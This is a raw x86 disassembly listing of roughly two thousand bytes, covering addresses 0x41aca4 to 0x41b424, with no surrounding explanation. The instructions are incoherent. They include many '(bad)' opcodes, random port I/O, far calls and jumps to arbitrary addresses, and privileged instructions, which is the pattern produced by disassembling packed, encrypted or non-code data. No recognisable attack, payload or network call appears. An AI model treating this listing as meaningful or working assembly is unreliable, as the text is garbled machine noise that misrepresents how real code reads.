  41aca4:	fsubr  st,st(5)
  41aca6:	fs jmp 0x7aaac61b
  41acac:	(bad)  
  41acad:	es mov dl,0xa6
  41acb0:	test   al,0xcf
  41acb2:	xor    bl,0xf6
  41acb5:	lods   al,BYTE PTR ds:[esi]
  41acb7:	addr16 (bad) 
  41acb9:	cmp    esp,DWORD PTR [eax-0x13]
  41acbc:	test   dh,al
  41acbe:	mov    DWORD PTR [edi-0x68],ecx
  41acc1:	inc    BYTE PTR [ecx+0x1a661c89]
  41acc7:	push   ebp
  41acc8:	dec    ecx
  41acc9:	or     eax,0xe3ef6ae9
  41acce:	push   ds
  41accf:	out    0xbc,eax
  41acd1:	lds    eax,FWORD PTR [ebx+0x5037c018]
  41acd7:	push   ebp
  41acd8:	pop    ebp
  41acd9:	xor    DWORD PTR [esi-0x1c],esp
  41acdc:	rcr    DWORD PTR [ebx],cl
  41acde:	(bad)  
  41acdf:	imul   ebx,DWORD PTR [edi],0xef9bfe3c
  41ace5:	jne    0x41ad08
  41ace7:	cmp    al,0x53
  41ace9:	cmp    ebp,DWORD PTR [eax]
  41aceb:	cmp    esp,DWORD PTR [edi]
  41aced:	mov    ecx,0x3325a6c2
  41acf2:	adc    ecx,DWORD PTR [edi+0x6085d513]
  41acf8:	ss cmp esp,esi
  41acfb:	out    dx,eax
  41acfc:	mov    ds:0xadf32ce,al
  41ad01:	or     DWORD PTR [ecx],0xe3083506
  41ad07:	hlt    
  41ad08:	int3   
  41ad09:	ret    0x125d
  41ad0c:	xchg   edi,eax
  41ad0d:	and    eax,DWORD PTR [edi-0x5ca82f77]
  41ad13:	jmp    0x41ad1d
  41ad15:	pop    edi
  41ad16:	inc    ebp
  41ad17:	fs mov al,0x85
  41ad1a:	push   ss
  41ad1b:	adc    ah,BYTE PTR [ebx-0x68]
  41ad1e:	push   edi
  41ad1f:	or     al,BYTE PTR [ebx+0x6e]
  41ad22:	out    0x5c,eax
  41ad24:	xchg   BYTE PTR [edi],ch
  41ad26:	and    ecx,DWORD PTR [ebx+0x2]
  41ad29:	push   cs
  41ad2a:	popf   
  41ad2b:	xchg   ecx,eax
  41ad2c:	cmp    DWORD PTR [edi-0x3faec75a],ebp
  41ad32:	retf   
  41ad33:	add    esi,DWORD PTR [ebx-0x421f632c]
  41ad39:	dec    eax
  41ad3a:	scas   al,BYTE PTR es:[edi]
  41ad3b:	test   dl,dl
  41ad3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad3e:	pop    ds
  41ad3f:	xor    esi,eax
  41ad41:	pushf  
  41ad42:	bound  esp,QWORD PTR [esi-0x6f]
  41ad45:	jbe    0x41ad43
  41ad47:	repnz les edi,FWORD PTR [ecx+0x22f71b2a]
  41ad4e:	pop    es
  41ad4f:	mov    esi,0x6e899dd2
  41ad54:	aas    
  41ad55:	xchg   edi,eax
  41ad56:	jp     0x41ad50
  41ad58:	pop    ebp
  41ad59:	mov    bl,0xef
  41ad5b:	and    esi,ebx
  41ad5d:	inc    esi
  41ad5e:	sahf   
  41ad5f:	repz ret 0x3b9e
  41ad63:	in     al,dx
  41ad64:	popf   
  41ad65:	(bad)  
  41ad67:	outs   dx,BYTE PTR ds:[esi]
  41ad68:	mov    ebx,edi
  41ad6a:	cmp    ah,BYTE PTR [ebx+0x0]
  41ad6d:	sub    eax,0x30ad7b14
  41ad72:	adc    al,0x4c
  41ad74:	test   DWORD PTR [eax-0x2],0x31a7336c
  41ad7b:	outs   dx,BYTE PTR ds:[esi]
  41ad7c:	fcmovb st,st(2)
  41ad7e:	mov    bh,bl
  41ad80:	pop    ecx
  41ad81:	push   edx
  41ad82:	outs   dx,BYTE PTR ds:[esi]
  41ad83:	mov    esp,DWORD PTR [edx]
  41ad85:	and    BYTE PTR [edi],0x95
  41ad88:	mov    ch,0x7e
  41ad8a:	out    dx,al
  41ad8b:	aam    0xbb
  41ad8d:	dec    esp
  41ad8e:	inc    eax
  41ad8f:	imul   eax,DWORD PTR [ecx],0xffffff81
  41ad92:	and    bh,BYTE PTR [edx+0x60]
  41ad95:	mov    ds:0xaef5d966,al
  41ad9a:	es inc esi
  41ad9c:	imul   esp,edi,0x26
  41ad9f:	or     DWORD PTR [edi],0x3b
  41ada2:	xor    ebp,esi
  41ada4:	xor    esi,DWORD PTR [edx]
  41ada6:	mov    ecx,0x6a80351b
  41adab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adac:	mov    esi,0x4ad03ce2
  41adb1:	test   dh,ah
  41adb3:	mov    ebx,0x4bb7397c
  41adb8:	xor    esp,esp
  41adba:	push   edi
  41adbb:	lahf   
  41adbc:	mov    dl,0xcb
  41adbe:	or     ecx,edi
  41adc0:	lods   eax,DWORD PTR ds:[esi]
  41adc1:	retf   
  41adc2:	mov    ds:0xf19c8d47,eax
  41adc7:	rcr    DWORD PTR [ebx+0x5714ba72],0x94
  41adce:	mov    cl,BYTE PTR [eax]
  41add0:	push   esi
  41add1:	push   es
  41add2:	jp     0x41ade1
  41add4:	sub    BYTE PTR [ebp-0x4ef9ef04],cl
  41adda:	ja     0x41adc2
  41addc:	call   0x3308:0x3d4794c1
  41ade3:	retf   0xc73c
  41ade6:	and    ebp,0xa5f2839f
  41adec:	es push ds
  41adee:	push   esp
  41adef:	push   ebp
  41adf0:	in     al,0x71
  41adf2:	imul   DWORD PTR [ebp-0x27]
  41adf5:	lods   eax,DWORD PTR ds:[esi]
  41adf6:	bnd je 0x41ae2b
  41adf9:	adc    dh,BYTE PTR [ebp+0x6c]
  41adfc:	push   ebp
  41adfd:	dec    esp
  41adfe:	and    eax,0x8fe9bd36
  41ae03:	mov    cl,0x8f
  41ae05:	push   ecx
  41ae06:	std    
  41ae07:	pop    es
  41ae08:	jl     0x41ae46
  41ae0a:	lahf   
  41ae0b:	mov    WORD PTR [ecx-0x4fd3cb08],ss
  41ae11:	retf   0xb003
  41ae14:	dec    ecx
  41ae15:	dec    esp
  41ae16:	shl    DWORD PTR [ecx],0x4e
  41ae19:	lock mov edx,0xda62de46
  41ae1f:	(bad)  
  41ae20:	mov    ?,WORD PTR [ecx]
  41ae22:	imul   edx,DWORD PTR [ebx-0x625191fd],0xb0132e5b
  41ae2c:	or     al,0xce
  41ae2e:	push   eax
  41ae2f:	not    BYTE PTR [ebp+0x3e8f4247]
  41ae35:	cmp    DWORD PTR [edx],ebp
  41ae37:	sbb    eax,0x564865ca
  41ae3c:	jmp    0x18f0216f
  41ae41:	xor    BYTE PTR [ebx-0x7aecd627],cl
  41ae47:	scas   eax,DWORD PTR es:[edi]
  41ae48:	inc    eax
  41ae49:	mov    eax,0x4d8b2c09
  41ae4e:	gs fcmovbe st,st(0)
  41ae51:	push   es
  41ae52:	in     eax,dx
  41ae53:	(bad)  
  41ae54:	push   cs
  41ae55:	xchg   edi,eax
  41ae56:	scas   eax,DWORD PTR es:[edi]
  41ae57:	sbb    eax,edi
  41ae59:	mov    DWORD PTR [ebx-0xa],ecx
  41ae5c:	aaa    
  41ae5d:	outs   dx,DWORD PTR ds:[esi]
  41ae5e:	add    DWORD PTR [edi+ebp*2+0x164acb8b],edi
  41ae65:	or     eax,0x37b4859b
  41ae6a:	ds aam 0x8a
  41ae6d:	imul   esi,DWORD PTR [ebp+eax*2-0x36],0x57
  41ae72:	jb     0x41aecb
  41ae74:	outs   dx,BYTE PTR ds:[esi]
  41ae75:	pop    ebp
  41ae76:	retf   0x4df9
  41ae79:	push   0x75
  41ae7b:	jl     0x41aec0
  41ae7d:	pop    DWORD PTR [edx-0x77]
  41ae80:	leave  
  41ae81:	and    ecx,esp
  41ae83:	rcl    bh,cl
  41ae85:	dec    eax
  41ae86:	add    ah,0xe3
  41ae89:	sub    eax,0x4d20388b
  41ae8e:	sub    al,0xb5
  41ae90:	imul   edi,ebx,0x70cbbde3
  41ae96:	xor    DWORD PTR [ebp-0x684fb052],eax
  41ae9c:	in     al,0x2
  41ae9e:	adc    al,0x90
  41aea0:	push   edx
  41aea1:	pop    es
  41aea2:	jmp    0x4314:0x1941dd25
  41aea9:	pop    esi
  41aeaa:	daa    
  41aeab:	or     eax,0xbb5061c6
  41aeb0:	cdq    
  41aeb1:	mov    ds:0x830230a9,eax
  41aeb6:	and    DWORD PTR [edi],ecx
  41aeb8:	ret    0xd987
  41aebb:	jp     0x41aea1
  41aebd:	dec    ebp
  41aebe:	push   esi
  41aebf:	imul   edi,DWORD PTR [ebp-0x1e],0xc279466f
  41aec6:	rol    DWORD PTR [esi-0x582a012b],cl
  41aecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aecd:	and    DWORD PTR [eax],eax
  41aecf:	retf   
  41aed0:	pop    ebx
  41aed1:	out    dx,al
  41aed2:	mov    dl,dl
  41aed4:	(bad)  
  41aed5:	cmp    eax,0x343811b8
  41aeda:	mov    al,BYTE PTR [ecx]
  41aedc:	push   edi
  41aedd:	ror    bl,cl
  41aedf:	ds ins BYTE PTR es:[edi],dx
  41aee1:	sub    eax,0x5db09411
  41aee6:	xlat   BYTE PTR ds:[ebx]
  41aee7:	xchg   DWORD PTR [esi],ebx
  41aee9:	mov    edi,cs
  41aeeb:	mov    dh,0xb3
  41aeed:	jo     0x41aef0
  41aeef:	test   BYTE PTR [esi-0x4a],al
  41aef2:	pop    ss
  41aef3:	add    esp,DWORD PTR [eax+0x15]
  41aef6:	cwde   
  41aef7:	pop    ss
  41aef8:	scas   eax,DWORD PTR es:[edi]
  41aef9:	repnz sub al,0xff
  41aefc:	std    
  41aefd:	or     al,0x15
  41aeff:	dec    ecx
  41af00:	out    0x11,eax
  41af02:	mov    es,WORD PTR [ebx-0x2ebdcce0]
  41af08:	xchg   esp,eax
  41af09:	jb     0x41af47
  41af0b:	and    DWORD PTR fs:[edx+0x46],esi
  41af0f:	sbb    eax,0xc2fe342
  41af14:	sbb    al,0x29
  41af16:	push   edx
  41af17:	push   edi
  41af18:	xor    al,0x7d
  41af1a:	mov    esi,0x2f24eaff
  41af1f:	daa    
  41af20:	pop    edi
  41af21:	into   
  41af22:	(bad)  
  41af23:	sar    BYTE PTR [ebx+edi*1-0x21],cl
  41af27:	dec    ecx
  41af28:	test   al,0xdb
  41af2a:	hlt    
  41af2b:	scas   al,BYTE PTR es:[edi]
  41af2c:	sub    cl,BYTE PTR [ecx-0x7ae77f2f]
  41af32:	jnp    0x41af45
  41af34:	test   al,0xcb
  41af36:	and    eax,0xa97b3b77
  41af3b:	xor    BYTE PTR [eax+eax*8],0x9e
  41af3f:	pop    esp
  41af40:	inc    ecx
  41af41:	pop    esi
  41af42:	jecxz  0x41afbc
  41af44:	inc    edi
  41af45:	dec    ecx
  41af46:	dec    esp
  41af47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af48:	push   edx
  41af49:	in     eax,dx
  41af4a:	cdq    
  41af4b:	call   0x9c0a:0x84354ff
  41af52:	mov    ds:0xedfcbc0a,eax
  41af57:	call   FWORD PTR [ebx+0x13]
  41af5a:	or     DWORD PTR [eax],ebx
  41af5c:	cld    
  41af5d:	xchg   DWORD PTR [edi+0x39],ebp
  41af60:	std    
  41af61:	into   
  41af62:	and    eax,0x251021f8
  41af67:	sub    ah,0xcc
  41af6a:	jne    0x41afd7
  41af6c:	jp     0x41afcd
  41af6e:	dec    esi
  41af6f:	jb     0x41afcc
  41af71:	test   al,0xda
  41af73:	xor    al,0x18
  41af75:	retf   0x38fb
  41af78:	adc    BYTE PTR [ebx-0x6b],ch
  41af7b:	les    ebp,FWORD PTR [ecx+edi*4]
  41af7e:	jb     0x41af5b
  41af80:	fisubr DWORD PTR ds:0x2afcbee1
  41af86:	imul   ebp,DWORD PTR [eax],0xffffff81
  41af89:	enter  0x86f4,0x86
  41af8d:	jnp    0x41af73
  41af8f:	loope  0x41afd4
  41af91:	cmp    al,0xec
  41af93:	aas    
  41af94:	imul   edx,edx,0x47
  41af97:	pop    es
  41af98:	fwait
  41af99:	retf   0xdc83
  41af9c:	in     eax,dx
  41af9d:	jecxz  0x41afb0
  41af9f:	fisttp WORD PTR [ebp-0x23cc2fbe]
  41afa5:	aaa    
  41afa6:	dec    edx
  41afa7:	adc    BYTE PTR [ecx-0x30],cl
  41afaa:	loop   0x41b02b
  41afac:	psllw  mm6,QWORD PTR [eax+edx*8+0x20]
  41afb1:	xorps  xmm7,xmm6
  41afb4:	fist   DWORD PTR [ecx-0x32]
  41afb7:	mov    ecx,0xc967f17b
  41afbc:	inc    ebx
  41afbd:	jb     0x41b00d
  41afbf:	add    DWORD PTR [edi-0x58],0x4ced91ed
  41afc6:	aaa    
  41afc7:	xchg   edi,eax
  41afc8:	ss (bad) 
  41afca:	push   esi
  41afcb:	cli    
  41afcc:	pop    ecx
  41afcd:	rcl    esp,0xb7
  41afd0:	ret    0x9e01
  41afd3:	fld    QWORD PTR [edx+0x16]
  41afd6:	test   BYTE PTR [esi-0x485692f9],dh
  41afdc:	mov    ch,0xd
  41afde:	lea    eax,ds:0xdc7cac01
  41afe4:	add    cl,BYTE PTR [esi+edx*2+0x68]
  41afe8:	outs   dx,BYTE PTR ds:[esi]
  41afe9:	cmp    cl,BYTE PTR [edi+0x48]
  41afec:	in     al,0xab
  41afee:	loop   0x41b028
  41aff0:	out    dx,eax
  41aff1:	jge    0x41afaf
  41aff3:	retf   0x33e2
  41aff6:	cli    
  41aff7:	or     edx,DWORD PTR [ebp+0x3c383e5a]
  41affd:	mov    eax,0xe215122c
  41b002:	lock sub DWORD PTR [esi],edi
  41b005:	dec    esp
  41b006:	dec    ebp
  41b007:	dec    edx
  41b008:	jne    0x41b070
  41b00a:	rdmsr  
  41b00c:	loopne 0x41b049
  41b00e:	and    eax,0xfd3bc7de
  41b013:	(bad)
  41b016:	aam    0x8c
  41b018:	push   ds
  41b019:	cmp    eax,0xb440df45
  41b01e:	pop    eax
  41b01f:	iret   
  41b020:	ret    0x7c0
  41b023:	xor    DWORD PTR [edi-0x57],esp
  41b026:	daa    
  41b027:	bound  ebx,QWORD PTR [ecx-0x46]
  41b02a:	pop    esi
  41b02b:	retf   
  41b02c:	xchg   edi,eax
  41b02d:	iret   
  41b02e:	les    ebp,FWORD PTR [edx+0x183f9595]
  41b034:	lahf   
  41b035:	jl     0x41b045
  41b037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b038:	inc    esp
  41b039:	pop    ebx
  41b03a:	and    dl,BYTE PTR [edx]
  41b03c:	cmp    eax,0x88921eac
  41b041:	sahf   
  41b042:	lds    ebp,FWORD PTR [edx]
  41b044:	repnz (bad) 
  41b047:	fidivr WORD PTR [ebp-0x46c1829b]
  41b04d:	mov    bl,0x74
  41b04f:	(bad)  
  41b050:	pop    eax
  41b051:	push   0x2d
  41b053:	xor    dh,ch
  41b055:	adc    BYTE PTR [edi-0x7d],al
  41b058:	adc    BYTE PTR [ecx],0xb9
  41b05b:	mov    edi,0x1868778b
  41b060:	mov    cs:0x7202e1bc,al
  41b066:	bound  ebp,QWORD PTR [eax-0x14]
  41b069:	push   ds
  41b06a:	loope  0x41b008
  41b06c:	mov    ebx,0xed6a9e78
  41b071:	idiv   BYTE PTR [ecx+eax*1]
  41b074:	imul   eax,DWORD PTR [ecx+0x70],0x2f4d5abc
  41b07b:	fldcw  WORD PTR [ecx+ebp*8+0x3f2c3b9b]
  41b082:	push   ebx
  41b083:	sub    ah,BYTE PTR [ebx-0x58]
  41b086:	adc    al,0x16
  41b088:	push   edi
  41b089:	stc    
  41b08a:	pop    esi
  41b08b:	mov    WORD PTR [edx-0x42],ss
  41b08e:	pop    esi
  41b08f:	xchg   ecx,eax
  41b090:	fucomi st,st(3)
  41b092:	out    0x61,al
  41b094:	push   ds
  41b095:	shl    dh,0xcc
  41b098:	maxps  xmm1,xmm7
  41b09b:	add    bh,BYTE PTR [ebx+0x6e]
  41b09e:	out    0x99,al
  41b0a0:	into   
  41b0a1:	cdq    
  41b0a2:	mov    cl,0xc
  41b0a4:	fs in  al,dx
  41b0a6:	fs cs push ss
  41b0a9:	test   eax,0xba9182f7
  41b0ae:	sub    eax,0xdcd71cf
  41b0b3:	adc    bl,bl
  41b0b5:	add    ecx,DWORD PTR [eax]
  41b0b7:	lahf   
  41b0b8:	xlat   BYTE PTR ds:[ebx]
  41b0b9:	fwait
  41b0ba:	test   eax,0x546887e4
  41b0bf:	or     edx,esi
  41b0c1:	push   dx
  41b0c3:	loope  0x41b0b0
  41b0c5:	push   eax
  41b0c6:	mov    ecx,0x312dd6a5
  41b0cb:	ss fwait
  41b0cd:	fwait
  41b0ce:	jmp    DWORD PTR [eax]
  41b0d0:	mov    eax,0x51e0090c
  41b0d5:	sahf   
  41b0d6:	pop    ebp
  41b0d7:	add    eax,0xa3c450ca
  41b0dc:	cld    
  41b0dd:	xchg   BYTE PTR [ebx+eiz*2],al
  41b0e0:	jno    0x41b14d
  41b0e2:	ja     0x41b0af
  41b0e4:	or     al,BYTE PTR [ecx+0x7a]
  41b0e7:	fistp  QWORD PTR [edi-0x6c36c0a8]
  41b0ed:	cmp    DWORD PTR [edi+0x17ba789b],0x90d4c245
  41b0f7:	add    eax,0xe49d000c
  41b0fc:	nop
  41b0fd:	jne    0x41b0ad
  41b0ff:	pop    ds
  41b100:	push   0xffffffb1
  41b102:	ins    BYTE PTR es:[edi],dx
  41b103:	arpl   WORD PTR [esi-0x43],si
  41b106:	or     ebx,DWORD PTR [eax]
  41b108:	push   0x55
  41b10a:	add    eax,0x75e15f14
  41b10f:	popf   
  41b110:	add    DWORD PTR [ebp+0x6509919f],ecx
  41b116:	in     al,dx
  41b117:	adc    DWORD PTR [edx-0x45],esp
  41b11a:	retf   
  41b11b:	cwde   
  41b11c:	add    BYTE PTR [edi],bh
  41b11e:	push   ebx
  41b11f:	cwde   
  41b120:	mov    al,ds:0xc85239c
  41b125:	cs test al,0xaa
  41b128:	gs mov edx,0x5cc7df9b
  41b12e:	cli    
  41b12f:	mul    DWORD PTR [ebp-0x43]
  41b132:	ins    DWORD PTR es:[edi],dx
  41b133:	pop    edx
  41b134:	dec    ebp
  41b135:	dec    edx
  41b136:	add    ebp,DWORD PTR [edi]
  41b138:	fsub   QWORD PTR [ebx+0x5b]
  41b13b:	lods   al,BYTE PTR ds:[esi]
  41b13c:	xchg   esi,eax
  41b13d:	out    0xcb,eax
  41b13f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41b141:	push   0x7c
  41b143:	xlat   BYTE PTR ds:[ebx]
  41b144:	push   edi
  41b145:	sub    al,0x96
  41b147:	inc    ebx
  41b148:	xchg   ebx,eax
  41b149:	dec    edx
  41b14a:	sbb    esi,DWORD PTR [esi+ecx*8-0x7b]
  41b14e:	hlt    
  41b14f:	xor    esp,0xff7b20c6
  41b155:	sbb    edx,DWORD PTR [edi-0x8a4212a]
  41b15b:	xor    al,0xf0
  41b15d:	(bad)  
  41b15e:	scas   al,BYTE PTR es:[edi]
  41b15f:	retf   
  41b160:	dec    ebp
  41b161:	sahf   
  41b162:	sub    ebp,esi
  41b164:	xor    eax,esp
  41b166:	mov    eax,0x453caea6
  41b16b:	arpl   WORD PTR [edi+eax*8],bx
  41b16e:	mov    BYTE PTR [bp+di-0x43],dh
  41b172:	ficom  WORD PTR [edx]
  41b174:	add    ebx,esp
  41b176:	jmp    0x41b1f4
  41b178:	xchg   ebp,eax
  41b179:	in     eax,0x86
  41b17b:	and    edi,DWORD PTR [edx+0x4c]
  41b17e:	push   edx
  41b17f:	hlt    
  41b180:	adc    eax,0xff3d69f0
  41b185:	ret    0xba65
  41b188:	adc    ebp,DWORD PTR [edi]
  41b18a:	push   esp
  41b18b:	bound  ebp,QWORD PTR [eax-0x35]
  41b18e:	popf   
  41b18f:	ret    0x9783
  41b192:	push   0xffffffd4
  41b194:	lahf   
  41b195:	mov    eax,0xd6effd3d
  41b19a:	iret   
  41b19b:	sti    
  41b19c:	inc    ebx
  41b19d:	fwait
  41b19e:	sub    BYTE PTR [ebx-0x35],dl
  41b1a1:	pop    edx
  41b1a2:	mov    bl,0x5c
  41b1a4:	xchg   BYTE PTR [ebp+0x5],al
  41b1a7:	int3   
  41b1a8:	sbb    bl,BYTE PTR [ecx]
  41b1aa:	mov    al,0xd9
  41b1ac:	fnstsw WORD PTR [eax]
  41b1ae:	jg     0x41b1c7
  41b1b0:	dec    esi
  41b1b1:	sbb    BYTE PTR [ebx],ah
  41b1b3:	and    dl,dl
  41b1b5:	sar    BYTE PTR [ebp+0x33ee95f6],cl
  41b1bb:	sub    DWORD PTR [ebx-0x4a],ecx
  41b1be:	retf   
  41b1bf:	sbb    DWORD PTR [edi],edi
  41b1c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1c2:	sub    al,0xba
  41b1c4:	cmp    ecx,ebp
  41b1c6:	test   DWORD PTR [ebx+0x5a],0x952795ef
  41b1cd:	sub    ch,BYTE PTR [ebp-0x70]
  41b1d0:	mov    bh,BYTE PTR [ecx-0x64310b80]
  41b1d6:	sbb    esi,DWORD PTR [ebx]
  41b1d8:	cs out dx,eax
  41b1da:	xor    al,0x15
  41b1dc:	pushf  
  41b1dd:	pushf  
  41b1de:	pop    ss
  41b1df:	repz dec eax
  41b1e1:	add    edx,ecx
  41b1e3:	add    eax,0x91fea0e5
  41b1e8:	addr16 push eax
  41b1ea:	(bad)  
  41b1eb:	mov    eax,0x727d5e68
  41b1f0:	rcl    DWORD PTR [ebx+0x6d052679],cl
  41b1f6:	cli    
  41b1f7:	stc    
  41b1f8:	es push ebp
  41b1fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1fb:	jb     0x41b1a6
  41b1fd:	mov    ds:0x1c8bdbba,eax
  41b202:	pop    ebx
  41b203:	cmp    bl,dh
  41b205:	xchg   ebp,eax
  41b206:	and    BYTE PTR [edi+0x79],ah
  41b209:	call   0x25c0:0x8eefc629
  41b210:	ds jge 0x41b272
  41b213:	add    ebx,DWORD PTR gs:[ecx]
  41b216:	mov    al,ds:0x87a5501a
  41b21b:	mov    eax,0x86860709
  41b220:	cmp    dl,BYTE PTR [edx]
  41b222:	mov    eax,0xfe8e3f2
  41b227:	imul   esp,DWORD PTR [ebx+eax*1-0x2a5ec545],0xffffffac
  41b22f:	test   al,0x4e
  41b231:	sub    dl,al
  41b233:	lahf   
  41b234:	scas   al,BYTE PTR es:[edi]
  41b235:	dec    ebx
  41b236:	pop    edx
  41b237:	inc    edx
  41b238:	dec    esp
  41b239:	or     cl,bl
  41b23b:	fwait
  41b23c:	mov    cl,BYTE PTR [edx+esi*2+0x4f4b63b7]
  41b243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b244:	cwde   
  41b245:	ror    bl,0x60
  41b248:	sub    DWORD PTR [eax],edi
  41b24a:	xor    dh,BYTE PTR gs:[edx-0x29e71d9d]
  41b251:	(bad)  
  41b252:	arpl   WORD PTR [ebx+0x22e73683],bx
  41b258:	or     BYTE PTR [si+0x24dc],bh
  41b25d:	adc    edi,0xffffffb2
  41b260:	loopne 0x41b26b
  41b262:	and    BYTE PTR [eax+0x37],bh
  41b265:	adc    ebx,DWORD PTR [ebp-0x25]
  41b268:	pop    es
  41b269:	mov    bh,0x58
  41b26b:	enter  0xa642,0xfc
  41b26f:	cmp    DWORD PTR [esp+ebp*4+0x7c84dfb1],edi
  41b276:	in     eax,0xc3
  41b278:	retf   
  41b279:	movmskps ebx,xmm5
  41b27c:	neg    DWORD PTR [ecx-0xbc923a0]
  41b282:	inc    esp
  41b283:	in     eax,dx
  41b284:	nop
  41b285:	and    DWORD PTR [ecx+0x7d],edx
  41b288:	cmc    
  41b289:	push   cs
  41b28a:	add    ch,dl
  41b28c:	int    0x5f
  41b28e:	retf   
  41b28f:	sub    BYTE PTR [edi+0x76e076ff],bh
  41b295:	fidivr DWORD PTR ds:0x86e542f6
  41b29b:	and    esp,0xf466d331
  41b2a1:	dec    ecx
  41b2a2:	cmp    eax,0xa4b3fc2f
  41b2a7:	mov    eax,ds:0xdb677b9a
  41b2ac:	aam    0xd6
  41b2ae:	mov    bl,0xd9
  41b2b0:	pop    ss
  41b2b1:	dec    eax
  41b2b2:	sbb    ah,BYTE PTR [eax]
  41b2b4:	push   ebp
  41b2b5:	aaa    
  41b2b6:	xchg   BYTE PTR [ecx-0xe23579b],dh
  41b2bc:	test   eax,0x358b025a
  41b2c1:	loop   0x41b285
  41b2c3:	daa    
  41b2c4:	out    0xc8,eax
  41b2c6:	sub    al,0x93
  41b2c8:	das    
  41b2c9:	lock adc ebx,DWORD PTR [ebx-0x77bd8a6e]
  41b2d0:	and    eax,0x69a95881
  41b2d5:	mov    bl,0x6c
  41b2d7:	hlt    
  41b2d8:	out    0x56,al
  41b2da:	adc    cl,BYTE PTR [ebx+ebp*4-0x176b7068]
  41b2e1:	jno    0x41b362
  41b2e3:	out    0x62,al
  41b2e5:	jne    0x41b32d
  41b2e7:	xor    DWORD PTR [ecx-0x3b],eax
  41b2ea:	xchg   ebp,eax
  41b2eb:	clc    
  41b2ec:	std    
  41b2ed:	sub    DWORD PTR [edi],eax
  41b2ef:	stos   DWORD PTR es:[edi],eax
  41b2f0:	gs jnp 0x41b347
  41b2f3:	(bad)  
  41b2f4:	push   ds
  41b2f5:	mov    bh,0x49
  41b2f7:	add    al,0xe5
  41b2f9:	test   eax,0xbdfa23dc
  41b2fe:	call   0xcd89fad3
  41b303:	mov    eax,ds:0xac3db41b
  41b308:	(bad)  
  41b30b:	cmp    ah,BYTE PTR [edx+0x7f042212]
  41b311:	shr    ah,1
  41b313:	inc    edi
  41b314:	loopne 0x41b2cb
  41b316:	ficomp WORD PTR [ecx+0x47]
  41b319:	retf   0x8a92
  41b31c:	inc    esp
  41b31d:	mov    BYTE PTR [esi-0x485292b7],ah
  41b323:	pop    esi
  41b324:	cmp    al,0xc2
  41b326:	bound  esp,QWORD PTR [ebx+ebx*8-0x31305abf]
  41b32d:	fucomip st,st(5)
  41b32f:	aaa    
  41b330:	mov    al,ds:0x805c0a8c
  41b335:	and    BYTE PTR [edx-0x7e89b72e],ah
  41b33b:	sub    esi,DWORD PTR [ecx+edi*2]
  41b33e:	jbe    0x41b351
  41b340:	mov    cl,0xf8
  41b342:	stc    
  41b343:	cmp    BYTE PTR [eax],ch
  41b345:	and    ecx,0xd539bb28
  41b34b:	adc    eax,0x37587842
  41b350:	(bad)
  41b354:	dec    esi
  41b355:	and    cl,BYTE PTR [edi-0xc]
  41b358:	xchg   ah,bh
  41b35a:	lock cmp eax,0x7ea8b0e1
  41b360:	outs   dx,DWORD PTR ds:[esi]
  41b361:	(bad)  
  41b362:	sbb    al,0xc3
  41b364:	dec    ebx
  41b365:	retf   
  41b366:	add    eax,0x93636b95
  41b36b:	test   eax,0x30348d07
  41b370:	ins    DWORD PTR es:[edi],dx
  41b371:	ret    0x4191
  41b374:	ins    BYTE PTR es:[edi],dx
  41b375:	pop    ecx
  41b376:	sub    DWORD PTR [esp+esi*4+0x2b],esp
  41b37a:	int3   
  41b37b:	ret    0x8478
  41b37e:	sub    eax,0xf6187892
  41b383:	mov    esi,0xa463dcf7
  41b388:	ror    DWORD PTR [esi],cl
  41b38a:	dec    edi
  41b38b:	sub    edx,DWORD PTR [ebx]
  41b38d:	ins    DWORD PTR es:[edi],dx
  41b38e:	mov    edx,DWORD PTR [edi+0x5e]
  41b391:	add    ebp,DWORD PTR [edi]
  41b393:	fbld   TBYTE PTR [ebp+edi*1-0x17a4b719]
  41b39a:	xor    eax,0x737ce109
  41b39f:	aas    
  41b3a0:	xchg   ebx,eax
  41b3a1:	inc    DWORD PTR [edx]
  41b3a3:	pop    ebp
  41b3a4:	shr    DWORD PTR [ebx+0x7ef222d1],0xde
  41b3ab:	in     eax,dx
  41b3ac:	jmp    0x7712e6b6
  41b3b1:	adc    DWORD PTR [ecx],esp
  41b3b3:	xor    eax,0x50be893d
  41b3b8:	dec    eax
  41b3b9:	sub    edx,edx
  41b3bb:	inc    esp
  41b3bc:	test   DWORD PTR [esp+edx*2-0x297a20be],esi
  41b3c3:	shr    BYTE PTR [ecx+edx*4],cl
  41b3c6:	push   ebx
  41b3c7:	mov    ecx,0xce9dbb45
  41b3cc:	mov    edi,0xdfeb6cb9
  41b3d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3d2:	(bad)  
  41b3d3:	int3   
  41b3d4:	dec    eax
  41b3d5:	mov    ebp,0xb345cbd
  41b3da:	jbe    0x41b417
  41b3dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3dd:	inc    edi
  41b3de:	test   DWORD PTR [ebp-0x2881fe10],ebx
  41b3e4:	xchg   al,ah
  41b3e6:	mov    edi,0xf19b03b1
  41b3eb:	sub    esi,ebx
  41b3ed:	(bad)  
  41b3ee:	xchg   ecx,eax
  41b3ef:	hlt    
  41b3f0:	icebp  
  41b3f1:	add    dl,dl
  41b3f3:	jle    0x41b3df
  41b3f5:	xchg   edi,eax
  41b3f6:	cld    
  41b3f7:	ror    BYTE PTR [esi+0x5a],cl
  41b3fa:	int3   
  41b3fb:	arpl   WORD PTR [ecx-0x6b],bp
  41b3fe:	mov    edi,0x3591752b
  41b403:	popa   
  41b404:	enter  0x5b8b,0x7c
  41b408:	pop    es
  41b409:	dec    eax
  41b40a:	push   eax
  41b40b:	cmp    al,0xe3
  41b40d:	(bad)  
  41b40f:	or     eax,0xc31b1ae8
  41b414:	sub    ebx,ebx
  41b416:	mov    bh,0xa5
  41b418:	idiv   BYTE PTR [eax]
  41b41a:	xor    DWORD PTR [edi+edx*8-0x37],esi
  41b41e:	mov    bl,0x46
  41b420:	sbb    ecx,esp
  41b422:	js     0x41b3eb
  41b424:	aad    0x38
